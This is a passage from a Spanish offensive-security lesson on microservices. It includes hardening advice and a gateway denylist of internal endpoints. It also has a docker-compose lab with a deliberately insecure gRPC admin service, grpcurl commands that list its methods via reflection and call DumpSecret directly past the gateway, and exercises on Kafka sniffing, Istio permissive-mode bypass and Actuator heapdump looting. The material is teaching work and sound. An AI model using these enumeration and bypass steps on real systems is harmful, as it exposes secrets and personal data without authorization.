No confíes solo en el gateway. Cada servicio debería hacer cumplir su propia autorización a partir de la identidad SPIFFE de quien llama, no de una cabecera.

```yaml
apiVersion: security.istio.io/v1
kind: AuthorizationPolicy
metadata:
  name: cart-allow-checkout-only
  namespace: prod
spec:
  selector:
    matchLabels:
      app: cart-svc
  action: ALLOW
  rules:
  - from:
    - source:
        principals: ["cluster.local/ns/prod/sa/checkout-svc"]
```

### 16.4 Denylist de endpoints internos en el gateway

`/actuator/*`, `/debug/*`, `/-/reload`, `/metrics`, `/internal/*` y la reflection de gRPC deberían filtrarse en el ingress y bloquearse desde internet, independientemente de la configuración upstream.

### 16.5 Desactiva la reflection de gRPC en producción

```go
// NO hagas esto en producción:
// reflection.Register(grpcServer)
```

O, si reflection hace falta para el tooling interno, vincúlala a un listener separado que solo escuche en localhost.

### 16.6 Observabilidad autenticada

Jaeger, Prometheus, Grafana y Kiali tienen que estar detrás de SSO. «Solo interno» no es un control de seguridad cuando un solo pod comprometido puede alcanzarlos.

## 17. Práctica: compose de dos servicios con reflection de gRPC

Vamos a levantar un backend gRPC pequeño con reflection habilitada y una API REST delante, enumerar la superficie gRPC, desactivar después reflection y volver a ejecutar para confirmar que la exposición se cierra.

### 17.1 Disposición de directorios

```text
mesh-lab/
├── docker-compose.yml
├── backend/
│   ├── Dockerfile
│   ├── go.mod
│   ├── main.go
│   └── proto/
│       └── admin.proto
└── api/
    ├── Dockerfile
    └── main.py
```

### 17.2 backend/proto/admin.proto

```protobuf
syntax = "proto3";
package lab.admin.v1;
option go_package = "lab/admin/v1;adminv1";

service AdminService {
  rpc Ping(PingRequest) returns (PingResponse);
  rpc DumpSecret(DumpRequest) returns (DumpResponse);
  rpc Impersonate(ImpersonateRequest) returns (ImpersonateResponse);
}

message PingRequest { string msg = 1; }
message PingResponse { string echo = 1; }
message DumpRequest {}
message DumpResponse { string secret = 1; }
message ImpersonateRequest { string user_id = 1; }
message ImpersonateResponse { string token = 1; }
```

### 17.3 backend/main.go (extracto)

```go
package main

import (
    "context"
    "log"
    "net"

    "google.golang.org/grpc"
    "google.golang.org/grpc/reflection"
    adminv1 "lab/admin/v1"
)

type server struct{ adminv1.UnimplementedAdminServiceServer }

func (s *server) Ping(_ context.Context, r *adminv1.PingRequest) (*adminv1.PingResponse, error) {
    return &adminv1.PingResponse{Echo: r.Msg}, nil
}
func (s *server) DumpSecret(context.Context, *adminv1.DumpRequest) (*adminv1.DumpResponse, error) {
    return &adminv1.DumpResponse{Secret: "sk_live_TOP_SECRET_KEY"}, nil
}
func (s *server) Impersonate(_ context.Context, r *adminv1.ImpersonateRequest) (*adminv1.ImpersonateResponse, error) {
    return &adminv1.ImpersonateResponse{Token: "impersonation-token-for-" + r.UserId}, nil
}

func main() {
    lis, _ := net.Listen("tcp", ":50051")
    s := grpc.NewServer()
    adminv1.RegisterAdminServiceServer(s, &server{})
    reflection.Register(s) // <-- desactiva esto en el paso 17.7
    log.Println("gRPC on :50051")
    s.Serve(lis)
}
```

### 17.4 docker-compose.yml

```yaml
services:
  backend:
    build: ./backend
    networks: [mesh]
    expose: ["50051"]
  api:
    build: ./api
    networks: [mesh]
    ports: ["8080:8080"]
    depends_on: [backend]
networks:
  mesh:
    driver: bridge
```

### 17.5 Levántalo

```bash
cd mesh-lab
docker compose up -d --build

# Desde tu host Kali, el backend no está expuesto directamente: ese es el punto.
# Lo atacamos desde *dentro* de la red del mesh uniéndonos a un contenedor auxiliar:
docker run --rm -it --network mesh-lab_mesh alpine sh
# Dentro del auxiliar:
apk add curl grpcurl bind-tools
```

### 17.6 Enumera con reflection encendida

```bash
# Descubre el backend por nombre DNS:
dig +short backend.mesh-lab_mesh

# Lista servicios vía reflection:
grpcurl -plaintext backend:50051 list
# grpc.reflection.v1.ServerReflection
# lab.admin.v1.AdminService

# Lista los métodos:
grpcurl -plaintext backend:50051 list lab.admin.v1.AdminService

# Describe el mensaje DumpSecret:
grpcurl -plaintext backend:50051 describe lab.admin.v1.DumpRequest

# Llama a DumpSecret directamente, saltándote el API gateway (:8080):
grpcurl -plaintext -d '{}' backend:50051 lab.admin.v1.AdminService.DumpSecret
# {"secret":"sk_live_TOP_SECRET_KEY"}
```

Nos hemos saltado la API por completo y hemos sacado un «secret» directamente de un servicio que daba por hecho que solo lo llamaría su vecino de confianza.

### 17.7 Desactiva reflection y vuelve a ejecutar

Edita `backend/main.go` y comenta la línea `reflection.Register(s)`. Después:

```bash
docker compose up -d --build backend

# Desde el contenedor auxiliar:
grpcurl -plaintext backend:50051 list
# Failed to list services: server does not support the reflection API

# Reflection está apagada. Pero si ya conoces los nombres de método (por un
# .proto filtrado, un cliente decompilado o un paquete capturado), todavía puedes llamarlos:
grpcurl -plaintext \
  -proto /tmp/admin.proto \
  -import-path /tmp \
  -d '{}' backend:50051 lab.admin.v1.AdminService.DumpSecret
# {"secret":"sk_live_TOP_SECRET_KEY"}
```

Conclusión: desactivar reflection quita la filtración de descubrimiento, pero no añade autorización. Un atacante decidido con cualquier pista del schema sigue llamando lo que quiera. Reflection es defensa en profundidad. La defensa real es autorización por método más network policy.

## 18. Ejercicios

### 18.1 Guiados

- **Reconocimiento por reflection.** Usando el lab de compose de la sección 17, escribe un one-liner de bash que liste cada servicio y cada método, y luego invoque cada método que acepte una petición vacía. Confirma que puedes llegar a `DumpSecret` sin conocer el schema de antemano.

- **Sáltate la puerta de entrada.** Añade un servicio `api` en Python Flask al stack de compose que exija un bearer token hardcodeado y reenvíe al backend. Desde el contenedor auxiliar, demuestra que puedes llegar al backend directamente en `:50051` sin el token, y documenta la invocación exacta de grpcurl que usaste.

- **Minería de topología en Jaeger.** Despliega Jaeger en local (`docker run -d --name jaeger -p 16686:16686 jaegertracing/all-in-one`), envía cinco peticiones a través del stack de compose instrumentado para emitir spans y, usando solo la API HTTP de Jaeger (sin UI), lista cada servicio, cada operación y cada tag de span observado.

### 18.2 Independientes

- **Sniff de PII en Kafka.** Levanta un Kafka de un solo nodo en docker-compose. Escribe un producer que publique eventos JSON `user.signup` con nombre, email y contraseña hasheada. Desde un contenedor consumer separado, sin credenciales, demuestra que puedes suscribirte al topic y enumerar los últimos 100 mensajes. Después aplica SASL/SCRAM y repite para confirmar la corrección.

- **Escape con Istio permissive.** Usando `minikube start --driver=docker` e `istioctl install --set profile=demo`, despliega una app de dos servicios. Pon el PeerAuthentication del mesh en `PERMISSIVE`. Desde un pod fuera del mesh (sin sidecar), alcanza el servicio en texto plano. Después cambia a `STRICT` y confirma que la llamada en texto plano es rechazada.

- **Botín del heapdump de Actuator.** Despliega una aplicación Spring Boot 2.x vulnerable con los endpoints de Actuator expuestos (hay muchas en GitHub para entrenamiento). Descarga `/actuator/heapdump`, extrae strings y enumera cada valor con pinta de credencial. Escribe un informe corto que identifique qué secrets son reales y cuáles son ruido.

## 19. Resumen y puntero a la lección siguiente

Los microservices no crearon tanto clases nuevas de vulnerabilidad como redistribuyeron la responsabilidad. El trabajo del atacante ahora es mapear esa distribución: qué servicio guarda qué secret, qué servicio protege de verdad el gateway (y cuál no), qué método permite la política del mesh, qué topic filtra PII.

Ideas clave de esta lección:

- El grafo de servicios es tu objetivo real. Empieza por mapearlo: DNS, UI de tracing, registro de servicios, reflection.
- Los gateways solo protegen lo que tiene que pasar por ellos. Los nombres DNS internos de Service se saltan de forma rutinaria cada control del gateway.
- Los service meshes dan mTLS y política, pero el modo `PERMISSIVE` y los sidecars mal configurados rompen el modelo. Los endpoints de debug del plano de control son premios gordos.
- La reflection de gRPC es una función de depuración que filtra toda la superficie de API cuando se deja encendida. Desactívala en producción y nunca confíes en ella como frontera de seguridad.
- La introspección de GraphQL, los huecos de authz por campo y el batching convierten un solo endpoint en una superficie de ataque grande.
- Las colas de mensajes llevan PII en claro y a menudo no tienen authn. Si puedes llegar al broker, puedes leer el negocio.
- La infraestructura de observabilidad (Jaeger, Prometheus, Grafana, collectors de OTel) está crónicamente infraautenticada y revela la topología que los atacantes más quieren ver.

La lección siguiente, Módulo 04 — Lección 06: Kubernetes Security From an Attacker's Perspective, se apoya en esto y se concentra en el sustrato que ejecuta casi cada despliegue moderno de microservices: el propio clúster de Kubernetes. Vamos a cubrir caminos de escape de pods, abuso de tokens de service account, enumeración de RBAC, bypasses de admission controllers y las CVE concretas que convierten un contenedor comprometido en un nodo comprometido y en un clúster comprometido.
